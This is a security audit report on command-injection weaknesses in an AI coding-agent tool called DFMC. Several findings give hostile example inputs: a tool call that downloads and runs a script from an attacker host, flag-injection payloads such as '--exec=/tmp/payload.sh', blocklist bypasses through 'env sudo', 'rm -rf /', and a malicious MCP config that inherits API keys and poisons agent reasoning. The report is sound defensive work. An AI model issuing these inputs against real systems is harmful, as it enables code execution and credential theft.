# sc-cmdi — Command Injection (CWE-77 / CWE-78 / CWE-88)

**Counts:** Critical 1 · High 4 · Medium 4 · Low 2 · Total 11

Targets the binary-execution surface across DFMC's tool engine, MCP
client, plugin runtime, hooks dispatcher, and adjacent web/TUI helpers.
The codebase consistently uses `exec.Command*` argv-style (no `sh -c`),
which removes classic CWE-78 shell-metacharacter injection at the
process boundary. The remaining risks therefore fall into:

  1. **Argument injection** — user-controlled strings reaching argv
     positions where a leading `-` is parsed as a flag (CWE-88 /
     CVE-2018-17456-class). Git's surface is well-guarded; `gh` and
     `go test` callers are not.
  2. **Allow-list bypass** — `run_command`'s blocked-binary list keys on
     the basename, but every tool that bypasses `run_command` and reaches
     `exec.Command*` directly (`patch_validation`, hooks, MCP, plugin)
     bypasses that list as well.
  3. **Hooks-as-code-exec** — config-driven shell strings are
     deliberately interpreted by `cmd.exe /C` or `sh -c`. This is by
     design but is the highest blast-radius surface in the binary.

---

## CMDI-001 — Critical — `patch_validation.validation_command` runs ANY binary, with overridable project root

**Severity:** Critical · **Confidence:** 95 · **CWE:** CWE-77

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\patch_validation.go:135-153`
- **Sink:** `exec.CommandContext(runCtx, cmdParts[0], cmdParts[1:]...)`

The `patch_validation` tool accepts two attacker-controllable params:
`validation_command` (parsed by `splitCommandArgs` then exec'd) and
`project_root` (line 66-68: `if override := ... projectRoot = override`).
Together this means an LLM tool call (or HTTP `POST /api/v1/tools/patch_validation`)
can:

  1. Execute any binary on PATH with arbitrary argv (`{"validation_command":"curl http://attacker/x.sh -o /tmp/x.sh && bash /tmp/x.sh","project_root":"/"}` — even though `splitCommandArgs` doesn't honour `&&`, an attacker can still set `validation_command:"/bin/sh"` with a custom `cmd.Dir` of their choosing).
  2. Pivot the working directory to anywhere on disk via `project_root`.
  3. Bypass `run_command`'s blocklist entirely — `rm`, `sudo`, `mkfs`,
     `shutdown` are NOT screened here. There is no `ensureCommandAllowed`,
     no `isBlockedShellInterpreter`, no `EnsureWithinRoot` on
     `cmdParts[0]`, no script-runner-eval-flag check.
  4. Bypass `apply_patch`'s read-before-mutate gate (it uses its own
     `applyHunks` to dry-run; the `validation_command` runs unconditionally
     regardless of any safety check on the patch itself).

The Phase-1 architecture sweep correctly noted that `run_command` has the
hardened block-lists; this tool is the **back door around them**. There
is no comment explaining why `validation_command` is unrestricted.

**Recovery:** route through `RunCommandTool` (which would apply the
block-list, eval-flag check, shell-interpreter refusal, and `EnsureWithinRoot`
on the binary path), or restrict to a hardcoded allowlist (`go test`,
`go build`, `go vet`, `npm test`, `pytest`).

---

## CMDI-002 — High — `benchmark.target` lacks flag-injection guard

**Severity:** High · **Confidence:** 90 · **CWE:** CWE-88

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\benchmark.go:104-109`

```go
args = append(args, target)              // target is a user-supplied string
...
cmd := exec.CommandContext(runCtx, "go", args...)
```

`target` flows directly to `go test` argv with no validation. A value
like `--exec=/tmp/payload.sh` (recognised by `go test`'s
`-exec` flag) would cause `go test` to invoke the attacker-named binary
to run every compiled test binary — instant code execution.

The git tools added `rejectGitFlagInjection` precisely for this class
(see `git_runner.go:128`). `benchmark` and `gh_runner` have a partial
form of the check but `benchmark` has none. Even an internal-only LLM
tool call (`{"target":"--exec=/tmp/x"}`) achieves RCE in the dfmc
process's identity.

Same comment applies to the other args (`cpuprofile`, `memprofile`)
which are added with `-cpuprofile <path>` / `-memprofile <path>`. A
`cpuprofile` value of `"--exec=/tmp/x"` lands BEFORE the path slot, so
the order forces it to be a value, but a path like `/etc/cron.d/payload`
still allows the attacker to drop a profile file at any writable
location (path-traversal class — see PATH-005).

---

## CMDI-003 — High — Hooks shell mode evaluates arbitrary command strings

**Severity:** High · **Confidence:** 95 · **CWE:** CWE-77

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\hooks\hooks.go:122-127, 256-264`

```go
useShell := true
if entry.Shell != nil { useShell = *entry.Shell }
else if len(entry.Args) > 0 { useShell = false }
...
return exec.CommandContext(ctx, "sh", "-c", command)
```

Default `useShell=true` means any hook entry whose YAML has only a
`command:` (the documented shape) is wrapped in `sh -c` / `cmd.exe /C`.
An attacker who can write to `~/.dfmc/config.yaml` OR (when
`hooks.allow_project=true`) the project-level `.dfmc/config.yaml`
achieves arbitrary shell execution on every `pre_tool` /
`user_prompt_submit` event. `CheckConfigPermissions` warns on
group/world-writable configs (line 303-313) but does not block startup.

This is documented in `hooks.go:266-298` and is intentional, but worth
calling out:

  1. The `hookEnv` projection (line 269-279) writes attacker-controlled
     `DFMC_TOOL_ARGS` (raw JSON of agent tool params, indirectly under
     remote-LLM influence — see RCE-002) into the hook process env.
     Whatever the user's hook does with `$DFMC_TOOL_ARGS` becomes a
     second-order injection sink (e.g. `echo "$DFMC_TOOL_ARGS" >> log.txt`
     is fine; `eval echo $DFMC_TOOL_ARGS` is RCE). DFMC ships no such
     hooks but documenting this in `hooks.go` would help operators.
  2. Project-hooks only run if `hooks.allow_project=true` at global
     level — the malicious-clone vector is mitigated, but the global
     config remains the weakest link.

---

## CMDI-004 — High — MCP client spawns subprocess with config-supplied command + env

**Severity:** High · **Confidence:** 90 · **CWE:** CWE-78

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\mcp\client.go:35-48`

```go
cmd := exec.Command(command, args...)
envVars := make([]string, len(os.Environ())); copy(envVars, os.Environ())
for k, v := range env { envVars = append(envVars, k+"="+v) }
cmd.Env = envVars
```

`MCPServerConfig` (config_types.go) supplies `Command`, `Args`, `Env`.
Sourced from project-level `.dfmc/config.yaml` (no `allow_project`-style
gate for MCP, unlike hooks). A malicious checkout that adds an MCP
server entry like:

```yaml
mcp:
  servers:
    - name: legit
      command: /tmp/x.sh
      args: ["--token", "..."]
```

is spawned at engine init. Inherits the parent's full env (line 38-39
copies `os.Environ()` first), including `ANTHROPIC_API_KEY` and the
other LLM keys. So a hostile MCP server can:

  - Achieve immediate code execution (any binary on PATH).
  - Exfiltrate API keys via env inheritance.
  - Spoof tool descriptions and tool-results to poison subsequent
    agent reasoning (see RCE-003).

There is no allow-list / signature / fingerprint check on the
configured MCP command. There is no warning at startup that a project's
`.dfmc/config.yaml` registered a new MCP server.

---

## CMDI-005 — High — `gh_runner` flag-injection check is one-sided

**Severity:** High · **Confidence:** 80 · **CWE:** CWE-88

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\gh_runner.go:60-65`

```go
for _, a := range args[1:] {
    if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") {
        return ..., fmt.Errorf("looks like a flag; use --flag=value or separate the flag", a)
    }
}
```

The check refuses single-dash args (`-x`) but **explicitly allows
double-dash** (`--`). gh subcommands accept `--repo`, `--web`, etc.
which is fine, but `--jq=$(curl http://x)` style payloads pass unchecked.
`gh api` (allowed at line 34) supports `--field` / `-f` reading from
files including `@/etc/shadow` shape — read-out of arbitrary files via
the GitHub API is plausible.

More importantly, the args[0] subcommand is matched against
`ghSafeSubcommands` at line 51-54 but not flag-checked. A subcommand
of `pr` followed by `--upload-pack=…`-style payload would not be caught
by this loop because the loop starts at `args[1:]`. The `gh` CLI does
not have `--upload-pack` semantics, but the check shape is still weaker
than git's `rejectGitFlagInjection`.

---

## CMDI-006 — Medium — `run_command` block-list misses sequenced privilege patterns

**Severity:** Medium · **Confidence:** 70 · **CWE:** CWE-78

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\command.go:296-358`

`isBlockedBinary` lists `sudo`, `doas`, `su`, `runas`, `pkexec`. But:

  1. **Path tricks**: `canonicalCommandBinary` calls `filepath.Base` +
     lowercase + `.exe`-strip. `command="/usr/local/bin/sudo"` →
     `binary="sudo"` → blocked. Good. BUT `command="su"` followed by
     args with `bash`/`sh` would be caught by the binary block (`su`)
     AND the shell-interpreter block (when `command="su"`, args has
     `bash`). However, `pkexec` followed by `bash -c "…"` — `pkexec`
     binary is blocked. So binary-name path coverage is OK.
  2. **Indirection bypass**: `env sudo …`, `nice sudo …`, `nohup sudo …`,
     `taskset sudo …` — none of `env`, `nice`, `nohup`, `taskset`,
     `time`, `xargs`, `chroot`, `stdbuf`, `setsid` are on the
     blocked-binary list, and they all accept a command name as their
     argv. `{"command":"env","args":["sudo","bash","-c","whoami"]}`
     would pass the binary check (`env` is allowed) and the shell-
     interpreter check (the `bash` is in args, not `command`), and
     `hasScriptRunnerWithEvalFlag` only catches inline `node -e` /
     `python -c` style. `env` would then exec `sudo bash -c whoami`.
  3. **Symlink bypass**: A user-writable symlink at `<root>/sudo →
     /usr/bin/sudo`. `command="./sudo"`. `looksLikePath(command)` is
     true (starts with `.`), so `EnsureWithinRoot` resolves it to a
     project-internal path; `isBlockedBinary` strips path → "sudo" →
     blocked. Path check works here (the binary-name strip is safe).
  4. **Case sensitivity**: lower-cased before compare (`canonicalCommandBinary`
     line 331). OK on Windows where `RM.EXE` lowercase-matches `rm`.

The big real gap is (2) — `env`/`nice`/`nohup`/`xargs`-style indirection.

---

## CMDI-007 — Medium — `run_command` allows pipe-based bypass via Unix shell-interpreter args

**Severity:** Medium · **Confidence:** 60 · **CWE:** CWE-78

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\command.go:90-97`

```go
if hasScriptRunnerWithEvalFlag(args) { return ..., "blocked" }
for _, arg := range args {
    if isBlockedShellInterpreter(arg) { return ..., "blocked" }
}
```

The script-runner check is name+next-arg specific: `{python,-c}`,
`{node,-e}`, etc. But what about `{python,/tmp/payload.py}`? Allowed
— it's not a `-c` flag, just a path argument. If the model previously
wrote a python script to disk via `write_file` (gated by
`EnsureWithinRoot`, so only project-internal), it could then exec
`python project/payload.py` — code exec by way of staged file. The
blocked-binary list does not include language interpreters except in
the `-e`/`-c` shape. This is by design (running `python script.py` is
a legitimate workflow), but it pairs with CMDI-001 to expand the
attack chain.

---

## CMDI-008 — Medium — `git_worktree_remove` `path` arg not constrained to project root

**Severity:** Medium · **Confidence:** 70 · **CWE:** CWE-22 (adjacent), CWE-78 (escalation)

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\git_worktree.go:189-218`

```go
path := strings.TrimSpace(asString(req.Params, "path", ""))
if err := rejectGitFlagInjection("path", path); err != nil { return ..., err }
// No EnsureWithinRoot here.
args := []string{"worktree", "remove"}
if asBool(req.Params, "force", false) { args = append(args, "--force") }
args = append(args, path)
```

The comment at line 200-202 explains the omission ("Worktrees may live
outside the project root if the user created them that way"), but the
`force=true` option then turns this into "remove ANY git worktree on
disk that the dfmc process can reach". `git worktree remove --force
/some/other/users/worktree` will succeed if writable. Combined with
the bbolt single-process lock, a malicious local user can't co-run a
second dfmc, but a single dfmc serving over auth=none on loopback gets
the same surface from a curl loopback.

`git_worktree_add` correctly applies `EnsureWithinRoot` at line 120.
`remove` should mirror this and require the path to be inside project
root OR present in `git worktree list` output.

---

## CMDI-009 — Medium — Hooks `Args` shell-free path skips path-containment

**Severity:** Medium · **Confidence:** 65 · **CWE:** CWE-78

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\hooks\hooks.go:246-249`

```go
func hookCommand(ctx context.Context, h compiledHook) *exec.Cmd {
    if !h.useShell { return exec.CommandContext(ctx, h.command, h.args...) }
    return shellCommand(ctx, h.command)
}
```

When the user opts into `args:` mode (avoiding shell interpretation),
the `command` field is passed straight to `exec.CommandContext` without
any block-list (`isBlockedBinary`/`isBlockedShellInterpreter`/
`hasScriptRunnerWithEvalFlag`) being applied. So a config of
`command: rm, args: [-rf, /]` passes through untouched. This is
arguably "the user wrote it, the user owns it" — but the `run_command`
tool refuses the same shape on the LLM's behalf. Hooks are operator-
configured, not LLM-configured, so the trust model is different, but
the README and `hooks.go:266-279` warning could call out the asymmetry.

---

## CMDI-010 — Low — `editor` env-var read in `cli_config.go` exec'd without sanitization

**Severity:** Low · **Confidence:** 70 · **CWE:** CWE-78

- **File:** `D:\Codebox\PROJECTS\DFMC\ui\cli\cli_config.go:282`

```go
cmd := exec.Command(editorParts[0], cmdArgs...)
```

The `EDITOR` env var is split with `splitCommandArgs` and exec'd. Trust
model: the user owns their env. Risk is that `dfmc config edit` run
with `EDITOR='sh -c "evil"'` exec's via shell. Argv-style though — no
`sh -c`, just the binary. Practical risk: low. Listed for completeness.

---

## CMDI-011 — Low — `git_blame` does not flag-check on `path` until after `EnsureWithinRoot`

**Severity:** Low · **Confidence:** 50 · **CWE:** CWE-88

- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\git_blame.go:32-78`

`EnsureWithinRoot(req.ProjectRoot, path)` is called at line 32. Then
`rejectGitFlagInjection("path", path)` at line 74. Order is fine
because `EnsureWithinRoot` already refuses absolute paths starting
with `-` if such paths exist outside root. But a user-supplied
`path = "-zzz"` in the project root (a file actually named `-zzz`)
would resolve, then be refused at line 74. Correct, but defensive
ordering would be flag-check first.

---

## Patterns observed

- The **single-mandated entry rule** (`executeToolWithLifecycle`) is
  upheld for the LLM agent loop. It is bypassed (deliberately) for MCP
  Drive tools and (incidentally) for hooks/MCP-client/plugin spawn.
  The intentional bypass for MCP Drive is documented; the others are
  not.
- **Argv-style exec is the dominant pattern**, which is the right
  default. The risk hot spots are the tools that **rebuild** an argv
  from user-controlled strings (`patch_validation.validation_command`,
  `benchmark.target`, hook entries with `useShell=true`).
- The **block-list lives in `run_command` only**. Every tool that
  shells out around `run_command` gets none of those guards. A
  `runProtected(name, args, opts)` shared helper would centralise the
  policy.
- **Flag-injection coverage is good for git, partial for gh, missing
  for go-test (benchmark) and patch_validation**.
